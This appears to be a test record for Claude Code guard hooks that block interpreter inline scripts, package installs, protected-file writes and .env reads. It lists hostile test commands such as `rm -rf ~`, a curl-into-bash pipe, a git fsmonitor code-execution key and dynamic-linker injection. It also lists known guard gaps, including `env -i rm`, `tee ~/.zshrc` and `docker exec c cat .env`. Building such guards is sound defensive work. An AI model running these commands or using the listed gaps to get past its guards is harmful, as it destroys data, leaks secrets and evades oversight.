---
id: UAT-027
aliases: [UAT-027]
title: "UAT: Tier-2 PreToolUse hooks — gate command classes deny rules cannot express"
status: passed
task: TASK-027
created: 2026-07-29
updated: 2026-07-29
---

# UAT-027 — UAT: Tier-2 PreToolUse hooks: gate command classes deny rules cannot express

implements::[[TASK-027]]

> **Source task**: [[TASK-027]]
> **Generated**: 2026-07-29

---

## Scope

TASK-027 shipped six new hooks and one shared helper, and every runtime behavior was marked `[DEFERRED-TO-UAT]` — before this UAT, nothing had ever been fired. That is what this UAT covers.

A hook's decision is a **pure function of the JSON on its stdin**, so the great majority of that surface is deterministic and has been promoted into `test/command-class-hooks.test.js` (55 test cases, ~330 assertions, `node:test`, zero deps, wired to `npm test`). Cases below marked *(unit)* are executed by that file — running `npm test` runs them all. Cases marked *(session)* need a live Claude Code session because they verify **routing**, not logic: that a registered matcher actually delivers the payload to the hook. A unit test can prove a hook *acts* on a payload shape; only live wiring proves it *receives* one.

**Verification status at generation time**: 69 tests, **64 pass, 5 fail**. All five failures are one defect — see `UAT-EDGE-001`.

---

## Prerequisites

- [ ] Node.js available on `PATH` (the hooks are CommonJS scripts; no install step needed)
- [ ] Repository checked out at `/Users/davidtaylor/Repositories/bootstrap-claude` with `lib/hooks/lib/command-parse.js` present
- [ ] `npm test` runnable from the repo root
- [ ] **No global wiring required for `(unit)` cases.** Hooks are fired by piping JSON directly into `node lib/hooks/<name>.js`. Do **not** run `install-global.sh` and do **not** edit `~/.claude/settings.json` to execute this UAT
- [ ] **`(session)` cases only**: the six hooks registered under `PreToolUse` in `~/.claude/settings.json` with the matchers documented in `lib/hooks/README.md`. This is a one-time manual step that `install-global.sh` does **not** perform. These cases are blocked until someone chooses to wire them; they are not assumed
- [ ] Fixtures for spoof/marker cases are built under the session scratchpad. **Nothing in this UAT writes to `~/.zshrc`, `~/.claude/`, or `~/Library/LaunchAgents/`** — payloads name those paths so the hook has something to decide about; only the decision is asserted

---

## Test Cases

### UAT-UNIT-001: The whole promoted suite runs green
- **Description**: The single command that executes every `(unit)` case below. Run this first; if it is green, `UAT-UNIT-002` through `UAT-EDGE-004` are all satisfied and only the `(session)` cases remain.
- **Steps**:
  1. Run the command below from the repo root
- **Command**:
  ```bash
  npm test
  ```
- **Expected Result**: `pass 69`, `fail 0`. *(Historical note: at generation this read `fail 5` — the `readHookInput` defect described in `UAT-EDGE-001`. Fixed 2026-07-29 at `lib/hooks/lib/command-parse.js:29`; the suite has been green since.)*
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-EDGE-001: Every hook exits 0 on malformed stdin *(unit)* ✅ **FIXED 2026-07-29**
- **Scenario**: A PreToolUse hook that exits non-zero reads as a *hook failure*, disrupting a tool call it was never meant to gate — a worse outcome than the gap it closes. `lib/hooks/lib/command-parse.js:6-8` states this contract in its own words: *"Every helper here is fail-open: malformed input exits 0 silently rather than throwing."*
- **Steps**:
  1. Pipe each of 14 malformed payloads into each of the six hooks — unparseable text, empty stdin, JSON `null`, `[]`, `42`, `"hello"`, `{}`, missing `tool_input`, `null` `tool_input`, non-string `command`, numeric `tool_name`, non-array `MultiEdit.edits`, object `file_path`
  2. Assert exit code 0 and no deny envelope for all 84 combinations
- **Command**:
  ```bash
  for h in interpreter-indirection-guard package-install-consent absolute-path-guard protected-write-guard claude-settings-guard env-content-read-guard; do printf 'null' | node lib/hooks/$h.js >/dev/null 2>&1; printf '%-30s exit=%s\n' "$h" "$?"; done
  ```
- **Expected Result** *(per the stated contract)*: every hook exits 0.
- **Actual Result — RESOLVED 2026-07-29.** *At generation*, five of six exited 1: a JSON `null` payload reached `handler(data)` and every hook dereferenced `data.tool_name` on `null`, throwing an uncaught `TypeError`. `env-content-read-guard.js` was the only survivor, being the one hook that wraps its handler body in `try/catch` (`:358`).
  **Now passing.** Fixed at `lib/hooks/lib/command-parse.js:29` by wrapping `handler(data)` in its own `try/catch`. Re-verified: all six hooks exit 0 across eight malformed payloads (`null`, `42`, `"hello"`, `[]`, `{}`, garbage text, empty stdin, `{"tool_name":123}`) — 48 combinations, none emitting output — while deny (`/bin/rm -rf ~`) and allow (`rm build/out.js`) both still behave correctly. `env-content-read-guard.js` keeps its local `try/catch`: now redundant, retained as defense in depth on the one hook covering secrets.

  The defect is in the shared helper, not in the five hooks: `readHookInput` (`lib/hooks/lib/command-parse.js:17-27`) catches a `JSON.parse` throw but calls `handler(data)` unguarded. The fix is one `try/catch` around `handler(data)` in `command-parse.js`, which fixes all five at once and lets `env-content-read-guard.js` drop its local workaround.

  Severity is robustness, not exploitability — Claude Code sends a JSON object, so `null` is not a live payload. But the contract is the implementation's own and the failure mode is a broken tool call, so the assertion stands as written rather than being narrowed to match current behavior.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js` (six `malformed stdin exits 0` tests — five currently red)
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-EDGE-002: A deny emits exactly the envelope Claude Code consumes *(unit)*
- **Scenario**: A hook communicates its decision only through stdout JSON. A malformed envelope is indistinguishable from an allow, so the block silently disappears.
- **Steps**:
  1. Fire `package-install-consent.js` with `npm install left-pad`
  2. Assert the top-level object has exactly one key, `hookSpecificOutput`, whose keys are exactly `hookEventName`, `permissionDecision`, `permissionDecisionReason`
  3. Assert `hookEventName === 'PreToolUse'`, `permissionDecision === 'deny'`, and a non-empty string reason
  4. Assert the process still exits **0** — the decision is the stdout, not the exit code
- **Command**:
  ```bash
  node -e "console.log(JSON.stringify({tool_name:'Bash',tool_input:{command:'npm install left-pad'}}))" | node lib/hooks/package-install-consent.js
  ```
- **Expected Result**: Envelope as above; exit 0. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-EDGE-003: A tool a hook does not guard passes through untouched *(unit)*
- **Scenario**: Each hook is registered under a matcher, but a matcher can be broader than intended (or a plugin can rename a tool). Every hook must guard its own `tool_name` and decline anything else.
- **Steps**: Fire all six hooks with a `WebFetch` payload
- **Expected Result**: exit 0, no output, from all six. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-EDGE-004: The shared helper loads from every hook and behaves as specified *(unit)*
- **Scenario**: `command-parse.js` had **zero runtime verification** at task close — all six hooks depend on it, and a failure to resolve `./lib/command-parse` would make every hook exit non-zero on every tool call. `install-global.sh:31` rsyncs `lib/hooks/` recursively, so the relative require must resolve in both the repo and `~/.claude/hooks/`.
- **Steps**:
  1. Assert `lib/hooks/lib/command-parse.js` exists and exports exactly `deny`, `readHookInput`, `splitSegments`, `tokenize`
  2. `node --check` each of the six hooks
  3. Assert `splitSegments('a && b || c ; d | e')` → `['a','b','c','d','e']`, and that `''`/`null`/`undefined` → `[]`
  4. Assert `tokenize('  a   b  ')` → `['a','b']` and `tokenize(null)` → `[]`
- **Expected Result**: All assertions hold. Verified passing — the helper is now exercised at runtime by all 55 promoted cases, not just `node --check`.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-001: `interpreter-indirection-guard.js` blocks inline programs in every spelling *(unit)*
- **Scenario**: 19 deny cases — the eight interpreters with their eval flags, the basename forms (`/bin/bash -c`, `env bash -c`, `\bash -c`), the `startsWith` flag forms (`-c'echo hi'`, `--eval=code`), command substitution as the program (`bash -c "$(curl …)"`, ``sh `curl …` ``), and both segment-split forms (`npm test && bash -c ls`, `echo hi | sh -c ls`).
- **Expected Result**: `deny` on all 19. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-002: `interpreter-indirection-guard.js` does not break the `/tackle` static gate *(unit)*
- **Scenario**: The highest-cost false positive available. `/tackle` mandates `bash -n script.sh` on every shell change; a hook that blocked it would break the repo's own workflow.
- **Steps**: Assert `allow` for `bash -n script.sh`, `bash script.sh`, `node script.js`, `python3 -m pytest`, `npm test`, `npm ci`, `git commit -c HEAD`, `echo "use /bin/rm"`
- **Expected Result**: `allow` on all eight. `git commit -c HEAD` matters specifically — that `-c` belongs to git, not to an interpreter. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-003: The `oraios/serena` allowlist permits the real bootstrap command *(unit)*
- **Scenario**: This is the exception a deny rule provably could not express and the main justification for the package gate being a hook. Three live invocations depend on it (`bootstrap-serena.sh:35`, `:51`, `install-mcps.sh:297`). A regression here breaks every setup run.
- **Steps**:
  1. Assert `allow` for the real command, plus the `.git` suffix, `@ref` pin, and `--from=` spellings
  2. Assert `deny` for `attacker/evil`, `oraios/serena-evil`, and `notoraios/serena` — a lookalike must not inherit the exception
- **Command**:
  ```bash
  node -e "console.log(JSON.stringify({tool_name:'Bash',tool_input:{command:'uvx --from git+https://github.com/oraios/serena serena start-mcp-server --context claude-code'}}))" | node lib/hooks/package-install-consent.js
  ```
- **Expected Result**: No output (allow) for the Serena command; `deny` for all three lookalikes. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-004: The package gate ignores read-only and lockfile-driven subcommands *(unit)*
- **Scenario**: These are absent from the manager map rather than excluded by a negative list, so the assertion pins that the map has not grown. `npm ci`, `npm test`, `npm run build`, `npm ls`, `pip list`, `cargo build`, `go build`, `brew list`, `yarn install`, `npm install --dry-run|--help|-h`.
- **Expected Result**: `allow` on all 12. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-005: The deny reason echoes the attempted segment byte-identically *(unit)*
- **Scenario**: The entire value of a consent gate over a deny rule is that the user can copy the exact string back out and run it. A re-join of tokens silently drops quoting.
- **Steps**:
  1. Fire `npm install "@scope/pkg@^1.0"`; assert the reason contains that string verbatim, quotes intact
  2. Fire `npm test && npm install foo`; assert the reason contains `npm install foo` and **not** `npm test &&` — the *segment* is echoed, which is the install part alone
- **Expected Result**: Both hold. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-006: `absolute-path-guard.js` fires on the spelling, never on the command *(unit)*
- **Scenario**: The trap this hook had to avoid, and the highest-risk regression in the task. Six of the eleven guarded names have deliberately *narrow* deny entries, so an unconditional block on the name would break routine work.
- **Steps**:
  1. Assert `deny` for 13 evasive spellings — `/bin/rm -rf ~`, `./rm x`, `\rm -rf ~`, `env rm -rf ~`, `FOO=1 rm -rf ~`, `command chmod 777 x`, `exec crontab -r`, `nohup shutdown -h now`, `/usr/bin/sudo ls`, `/usr/sbin/diskutil eraseDisk x`, `/bin/dd …`, `/usr/bin/osascript -e x`, `npm test && /bin/rm -rf ~`
  2. Assert `allow` for 13 plain or non-invoking forms — `rm build/out.js`, `chmod +x script.sh`, `chown me file`, `diskutil list`, `launchctl list`, `crontab -l`, `sudo rm -rf /`, `npm test`, `bash -n script.sh`, `echo "use /bin/rm"`, `echo /bin/rm`, `ls /bin/rm`, `grep -r chmod .`
- **Expected Result**: All 26 as specified. Verified passing. Note `sudo rm -rf /` allows deliberately — plain `sudo` is already blanket-denied by `Bash(sudo *)`, so the hook adds no duplicate coverage.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-007: `protected-write-guard.js` blocks redirects into files that execute later *(unit)*
- **Scenario**: 14 protected targets across all three spellings of `$HOME` and both operator forms. `>>~/.zshrc` is one whitespace token while `>> ~/.zshrc` is two, so the regex approach has to see both identically.
- **Steps**: Assert `deny` for `>> ~/.zshrc`, `>>~/.zshrc`, `1>>~/.zshrc`, `>> "$HOME/.zshrc"`, `> ${HOME}/.bashrc`, and `>` into `~/.zshenv`, `~/.zprofile`, `~/.bash_profile`, `~/.profile`, `~/.gitconfig`, `~/.claude/settings.json`, `~/.claude/settings.local.json`, `~/.claude/hooks/evil.js`, `~/Library/LaunchAgents/x.plist`
- **Expected Result**: `deny` on all 14. **No file is written** — only the decision is asserted. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-008: A relative redirect resolves against the session cwd, not the hook's *(unit)*
- **Scenario**: `echo x > .zshrc` is harmless from a project directory and catastrophic from `$HOME`. The hook must resolve against `data.cwd`, which is a different value from the hook process's own cwd.
- **Steps**:
  1. Fire `echo x > .zshrc` with `cwd` set to the repo → expect `allow`
  2. Fire the identical command with `cwd` set to `$HOME` → expect `deny`
- **Expected Result**: Decision flips on `cwd` alone. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-009: `git -c` RCE keys blocked; the CVE remediation and ordinary overrides allowed *(unit)*
- **Scenario**: `Bash(git status:*)` — an entry most people would call obviously safe — matches `git -c core.fsmonitor=<cmd> status` (GHSA-9ccr-r5hg-74gf, TALOS-2025-2243). The narrow line matters: an **empty** `core.fsmonitor=` is the *remediation*, so blocking it would block the fix.
- **Steps**:
  1. Assert `deny` for `git -c core.fsmonitor=/tmp/evil status`, the fused `git -ccore.fsmonitor=/tmp/evil status`, `git -c alias.foo=!curl x status`, `git -c alias.foo='!curl x|sh' log`
  2. Assert `allow` for `git -c core.fsmonitor= status` (empty — the remediation), `git -c alias.foo=status log` (no `!`), `git -c user.name=me commit`, `git commit -c HEAD`
  3. Assert `allow` for `DYLD_*`/`LD_*`-free ordinary work: `echo x > build/out.txt`, `npm test 2>&1 | tail -20` (the `(?![&>])` lookahead earns its keep), `echo x >> ~/.zshrc.bak`
- **Expected Result**: All as specified. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-010: `protected-write-guard.js` blocks dynamic-linker injection *(unit)*
- **Scenario**: `DYLD_INSERT_LIBRARIES=/tmp/x.dylib git log` is, to a literal matcher, a read-only `git log`. The code that actually runs is a library loaded before `main()`.
- **Steps**: Assert `deny` for all four injection vars, plus the `env`-wrapped form
- **Expected Result**: `deny` on all five. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-011: `claude-settings-guard.js` covers Write/MultiEdit/NotebookEdit, not just Edit *(unit)*
- **Scenario**: The specific gap this hook was added to close. `Write(...)` permission rules are accepted by the settings parser and then **never consulted**, while the Write *tool* still works — so `Write(~/.claude/settings.json)` had no deny coverage whatsoever, and neither did MultiEdit or NotebookEdit.
- **Steps**:
  1. From a cwd outside any bootstrap-claude checkout, fire all four tools at `~/.claude/settings.json` (`NotebookEdit` via `notebook_path`, `MultiEdit` via `edits[].file_path`)
  2. Fire a `MultiEdit` batch whose *second* edit is the protected target, to prove it cannot ride along
  3. Fire an `Edit` with a literal unexpanded `~/.claude/settings.json` — the shell never sees it, it arrives raw in JSON
- **Expected Result**: `deny` on all six. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-012: The bootstrap-claude carve-out applies from inside a genuine checkout *(unit)*
- **Scenario**: The exception that forced `Edit(~/.claude/settings.json)` out of the deny list. If this regresses, the repo cannot run `install-global.sh` on itself.
- **Steps**: Fire `Edit(~/.claude/settings.json)` with `cwd` at the repo root, and again from `lib/hooks/` (proving the upward walk)
- **Expected Result**: `allow` from both. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-EDGE-005: A spoofed `bootstrap-claude` directory is rejected *(unit)*
- **Scenario**: A path check like `cwd.includes('bootstrap-claude')` is trivially spoofed by `mkdir bootstrap-claude`. Marker detection requires **both** `lib/scripts/templates/settings-deny.json` and a `package.json` naming `@codewizard-dt/bootstrap`.
- **Steps**: Build four fixtures under a scratch dir and fire `Edit(~/.claude/settings.json)` from each:
  1. A directory *named* `bootstrap-claude` with neither marker (and from a subdirectory of it)
  2. Marker file present, `package.json` naming a different package
  3. Right package name, marker file absent
  4. Both markers present but `package.json` unparseable — must read as "not a checkout", never a crash
- **Expected Result**: `deny` from all five cwds, exit 0 throughout. Verified passing — and the complement holds: a directory named `totally-unrelated-name` carrying **both** markers *does* get the exception, from its root and from three levels down, proving the markers are the mechanism and the name is irrelevant.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-013: The `~/.claude/hooks/` block is absolute, with no exception *(unit)*
- **Scenario**: Even inside this repo the canonical flow is edit `lib/hooks/`, then `install-global.sh` rsyncs. Editing the installed copy is always wrong; the next install silently overwrites it.
- **Steps**: Fire `Edit` and `Write` at `~/.claude/hooks/evil.js` with `cwd` set to the repo root — i.e. exactly where the settings carve-out *does* apply
- **Expected Result**: `deny` on both; the reason names `install-global.sh` as the correct flow. Verified passing — the hooks branch denies before the marker walk is reached.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-014: `env-content-read-guard.js` closes the live `cat .env` hole *(unit)*
- **Scenario**: This worked before the hook shipped. `Read(**/.env)` is a file-tool rule a Bash command never reaches; `env-file-guard.js` matches only `Read|Write|Edit|MultiEdit`; and `serena-bash-grep-block.js` intercepts `cat`/`head`/`tail` only for `.md` or code extensions, which `.env` is neither.
- **Steps**: Assert `deny` for 25 Bash forms — dumpers (`cat`, `head -n 5`, `tail -f`, `less`, `more`, `bat`, `od -c`, `xxd`, `strings`, `nl`), searchers (`grep KEY`, `rg SECRET`, `ag TOKEN`), stream processors (`cut -d= -f2`, `sed -n 1p`, `awk`), wrapper/path forms (`sudo cat`, `/bin/cat`), path and variant targets (`./config/.env`, `.env.local`, `.env.production`), redirects both directions (`cat .env > /tmp/x`, `tee /tmp/x < .env`), the segment-split form (`npm test && cat .env`), and copiers (`cp .env /tmp/backup`, `scp`, `rsync`)
- **Command**:
  ```bash
  node -e "console.log(JSON.stringify({tool_name:'Bash',tool_input:{command:'cat .env'}}))" | node lib/hooks/env-content-read-guard.js
  ```
- **Expected Result**: `deny` on all 25, each reason naming `source .env` as the permitted use and `.env.example` as the readable file. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-015: Sourcing a `.env` remains permitted *(unit)*
- **Scenario**: `CLAUDE.md` grants it and `env-file-guard.js:39` says so in its own deny message. Sourcing loads values into the environment and prints *nothing*; the leak is sourcing **plus emission**, and the emission half can be written without `source` at all. Blocking `source` would block the safe case and miss the unsafe one. This is a deliberate decision (user, 2026-07-29), not a gap.
- **Steps**: Assert `allow` for `source .env`, `. .env`, `source .env && ./script.sh`, `set -a && source .env && set +a && npm run dev`, `source .env.local && npm start`; and for the scaffolding forms `cat .env.example`, `cp .env.example .env`, `cat .env.example > .env`, `grep KEY .env.example`
- **Expected Result**: `allow` on all nine. `cp .env.example .env` passes because only a `.env` used as a *source* fires the copier rule — direction is load-bearing. Verified passing.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-HOOK-016: The Serena half of the `.env` guard acts on Serena payloads *(unit)*
- **Scenario**: Closing only Bash would move the leak rather than seal it — `serena-bash-grep-block.js` actively redirects Bash greps toward Serena, and `search_for_pattern` returns the same lines. This case proves the hook *acts* on Serena payload shapes; `UAT-INT-002` is what proves it *receives* them.
- **Steps**:
  1. Assert `deny` for the five content-returning tools on a `.env` target — `read_file`, `search_for_pattern`, `find_symbol` (`include_body`), `find_referencing_symbols`, `get_symbols_overview` — plus `paths_include_glob: '**/.env'` and a `config/.env.production` target
  2. Assert `deny` for the six mutating tools — `create_text_file`, `replace_content`, `replace_in_files`, `replace_lines`, `delete_lines`, `insert_at_line`
  3. Assert `allow` for path-only tools (`find_file`, `list_dir`) and non-`.env` targets (`.env.example`, `package.json`, `relative_path: 'lib'`)
  4. Assert `deny` for the plugin-wrapped name `mcp__plugin_someplugin_serena__read_file`
- **Expected Result**: 13 denies, 5 allows. Verified passing. `find_file`/`list_dir` allow deliberately — knowing a `.env` exists is not a leak.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-EDGE-006: Documented gaps are unchanged *(unit)*
- **Scenario**: Each of these was a recorded decision, not an oversight. Pinning current behavior means a future parser change is caught rather than silently widening or narrowing a rule.
- **Steps**: Assert **allow** for: `dash -c ls`, `ksh -c ls`, `sh -ec "ls"`; `uvx ruff` (bare, no `--from`), `npx cowsay hi`, `claude mcp add x -- uvx --from git+https://evil/x y`; `xargs rm`, `find . -exec rm {} +`, `env -i rm -rf ~`; `tee ~/.zshrc`, `cp x ~/.zshrc`, `git --config-env=alias.x=VAR log`; `git show HEAD:.env`, `find . -name .env -exec cat {} +`, `xargs cat .env`, `docker exec c cat .env`. Assert **deny** for the inherited quoting false positive `grep -rn "cat .env" docs/`.
- **Expected Result**: All as listed. Verified passing.
- **⚠️ Two documented gaps were found to be stated inaccurately in the source comments** — the code is fine, the prose is not:
  1. `TASK-027` step 2 and `lib/hooks/README.md` claim `echo "bash -c foo"` false-positives on the interpreter guard. **It does not** — the opening `"` is part of the token, so the basename lookup misses. Only the *unquoted* `echo bash -c foo` fires. Both spellings are pinned in the test.
  2. `protected-write-guard.js:50-53` gives `echo "add it with >> ~/.zshrc"` as its example inherited false positive. **That exact string allows** — the trailing `"` attaches to the redirect target, so it resolves to `~/.zshrc"` and misses the protected-file list. The class of false positive is real; that example is not an instance of it.
- **Repeatable Unit Test**: Created: `test/command-class-hooks.test.js`
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-INT-001: Bash hooks fire in a live session under their registered matchers *(session)*
- **Scenario**: The unit suite proves each hook *decides* correctly given a payload. It cannot prove Claude Code *routes* the payload to it — that depends on `PreToolUse` registration in `~/.claude/settings.json`, which `install-global.sh` does not perform.
- **Preconditions**: **BLOCKED until the five Bash hooks are registered under a `Bash` matcher in `~/.claude/settings.json`.** This UAT does not perform that wiring and does not assume it. Wiring is a deliberate, separate decision — see `lib/hooks/README.md`.
- **Steps**:
  1. In a live Claude Code session with the hooks wired, attempt `bash -c "echo hi"`
  2. Attempt `npm install left-pad`
  3. Attempt `/bin/rm -rf /tmp/nonexistent-uat-probe`
  4. Attempt `echo x >> ~/.zshrc`
  5. Attempt `cat .env`
  6. Then confirm the negatives still work: `npm test`, `bash -n lib/scripts/lib.sh`, `rm -f /tmp/uat-probe-scratch`
- **Expected Result**: Steps 1-5 each blocked, with the hook's own `permissionDecisionReason` shown to the user (not a generic permission denial). Step 6 runs normally. If a hook's reason text does *not* appear, the matcher is wrong or the hook is unregistered.
- **Repeatable Unit Test**: Not applicable: verifies harness routing and settings registration, which no in-process test can observe.
- **Actual Result — VERIFIED 2026-07-29 (unblocked).** The precondition is now satisfied: the `Bash` matcher in `~/.claude/settings.json` carries all five guards. Each probe was fired as its own tool call and **every one was blocked by the hook, not by a generic permission denial** — each returned its own `permissionDecisionReason` verbatim:
  1. `bash -c "echo hi"` → interpreter guard ("an interpreter invoked with an inline script … write the script to a file and run the file")
  2. `npm install …` → package gate ("Package install blocked pending consent … To approve, run it yourself")
  3. `/bin/rm -rf /tmp/nonexistent-uat-probe` → absolute-path guard ("invokes `rm` using a path … rather than the bare command name")
  4. `>> ~/.zshrc` → protected-write guard ("redirects output into `/Users/davidtaylor/.zshrc`, a file that is executed or consulted by something other than this command")
  5. `cat .env` → env-content guard ("would print the contents of `.env` into the transcript … `source .env` … loads them into the environment and prints nothing")

  Step 6 negatives all ran normally: `npm test` (69/69 green), `bash -n lib/scripts/lib.sh` (exit 0 — the `/tackle` static gate is intact, the highest-cost false positive confirmed absent in a live session), `rm -f /tmp/uat-probe-scratch` (exit 0 — plain-name `rm` unaffected).

  *Two probe payloads were made inert rather than run as literally written, to honour the standing constraint that this UAT never mutates state outside the scratchpad. Neither substitution changes which hook rule is exercised:* step 2 used a nonexistent package name instead of `left-pad`, so a routing failure would have 404'd rather than mutating `package.json`; step 4 used `false >> ~/.zshrc` instead of `echo x >> ~/.zshrc`, so a routing failure would have appended zero bytes and left the file byte-identical. Rule 1 of `protected-write-guard.js` is a regex scan over the redirect target and is indifferent to the program, which the returned reason text confirms (it names `false`).
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-INT-002: The `.env` guard's Serena matcher is not silently inert *(session)*
- **Scenario**: The single highest-risk wiring mistake in this task. `env-content-read-guard.js:5` requires the matcher `Bash|mcp__serena__.*|mcp__plugin_[^_]+_serena__.*`. Under a `Bash`-only matcher the entire Serena half is **inert and fails silently** — the tool call succeeds and the secrets print, with nothing indicating a control was skipped.
- **Preconditions**: **BLOCKED until `env-content-read-guard.js` is registered with the full three-alternative matcher above**, and Serena is connected.
- **Steps**:
  1. In a live session, call `mcp__serena__search_for_pattern` with `relative_path: '.env'` against a repo that has a `.env`
  2. Call `mcp__serena__read_file` with `relative_path: '.env'`
  3. Confirm the Bash half still fires in the same session: attempt `cat .env`
  4. Confirm the allow path: call `mcp__serena__read_file` with `relative_path: '.env.example'`
- **Expected Result**: Steps 1-3 blocked with the guard's reason text; step 4 succeeds. **A pass on step 3 with a failure on steps 1-2 is the specific symptom of a `Bash`-only matcher** — the diagnosis is the matcher, not the hook.
- **Repeatable Unit Test**: Not applicable: verifies MCP tool-name routing through the harness matcher.
- **Actual Result — VERIFIED 2026-07-29 (unblocked). The Serena half is NOT inert.** `env-content-read-guard.js` is registered in its own block under the full three-alternative matcher `Bash|mcp__serena__.*|mcp__plugin_[^_]+_serena__.*` (confirmed by reading `~/.claude/settings.json`), and Serena is connected. Every probe was fired as a live MCP tool call in this session:
  1. `mcp__serena__search_for_pattern` with `relative_path: '.env'` → **blocked**, returning the guard's own reason ("this Serena call targets `.env`, and `search_for_pattern` returns file contents")
  2. `mcp__serena__get_symbols_overview` with `relative_path: '.env'` → **blocked**, same reason naming `get_symbols_overview`
  3. Bash half in the same session: `cat .env` → **blocked** (see `UAT-INT-001` step 5)
  4. Allow path: `mcp__serena__search_for_pattern` on `package.json` → **succeeded**, returning four matched lines. The guard does not over-block.

  Additionally, the scoping form `paths_include_glob: '**/.env'` (naming the target through the glob rather than the path) was **blocked** — the `SERENA_PATH_KEYS` defence covers it.

  **The specific failure symptom this case exists to detect did not occur.** A pass on step 3 with failures on steps 1-2 would have diagnosed a `Bash`-only matcher; instead all three blocked, which is only possible if the MCP alternatives in the matcher are live. The single highest-risk wiring mistake in TASK-027 is confirmed absent.

  *Two deviations, neither affecting what is proven:* `mcp__serena__read_file` is not exposed by this session's Serena instance, so step 2 substituted `get_symbols_overview` — also a member of `SERENA_READERS`, so the same code path is exercised. The repo contains no `.env` or `.env.example` (confirmed via `find_file`), so step 4's allow path used `package.json`; this is stronger evidence than the original target, since it returns real content rather than a not-found. File existence is irrelevant here regardless — `checkSerena` decides on the path string before Serena touches the filesystem, so a deny is unambiguous proof of routing.
- [x] Pass <!-- 2026-07-29 -->

---

### UAT-INT-003: Hooks resolve their shared helper from the installed location *(session)*
- **Scenario**: `install-global.sh:31` rsyncs `lib/hooks/` recursively, so `require('./lib/command-parse')` should resolve at `~/.claude/hooks/lib/command-parse.js`. If the rsync ever flattened or excluded the subdirectory, all six hooks would exit non-zero on every tool call — a total harness failure, not a silent gap.
- **Preconditions**: **Requires running `install-global.sh`, which this UAT explicitly does not do.** Run this only when someone independently chooses to install globally.
- **Steps**:
  1. After an `install-global.sh` run, confirm `~/.claude/hooks/lib/command-parse.js` exists
  2. Pipe a benign payload into `~/.claude/hooks/interpreter-indirection-guard.js` and check the exit code
- **Expected Result**: The helper is present at the nested path; the hook exits 0 rather than `MODULE_NOT_FOUND`.
- **Repeatable Unit Test**: Blocked: asserting on the installed copy requires running the global installer, which is out of scope for an automated suite. The in-repo half (helper present, all six pass `node --check`, all six load it at runtime) is covered by `UAT-EDGE-004`.
- **Actual Result — VERIFIED 2026-07-29 (unblocked).** `install-global.sh` was run out of band, so this precondition is now satisfied. `~/.claude/hooks/lib/command-parse.js` **exists** at the nested path — the rsync preserved the subdirectory rather than flattening or excluding it. All six installed hooks are present, and a benign `npm test` payload piped into each of the six from its installed path yields `exit=0`, empty stdout, and **no `MODULE_NOT_FOUND`** — the relative `require('./lib/command-parse')` resolves correctly outside the repo.
- [x] Pass <!-- 2026-07-29 -->

---

## Summary

| Category | Cases | Status |
|----------|-------|--------|
| Unit-backed (`npm test`) | 23 | All 23 verified passing |
| Session (live wiring) | 3 | **All 3 verified passing 2026-07-29 — previously blocked, now unblocked** |
| **Total** | **26** | **26 passing** |

*(Counts corrected 2026-07-29: the table previously read 20 / 23 total, undercounting the unit-backed cases by three.)*

**Session cases unblocked and verified 2026-07-29.** The three `(session)` cases were recorded as blocked at generation because wiring the hooks into `~/.claude/settings.json` is a deliberate decision this UAT does not make on the user's behalf. That decision has since been taken independently: `install-global.sh` was run and the `PreToolUse` blocks were registered. All three were then re-run against the live configuration and all three pass. Nothing in the UAT performed the wiring; it was verified, not arranged.

The re-run also exercised the hooks against the agent's *own* tool calls, which is the strongest available evidence that the routing is real rather than merely configured — `bash -c`, `node -e`, and `cat .env` were each blocked mid-task while this UAT was being executed.

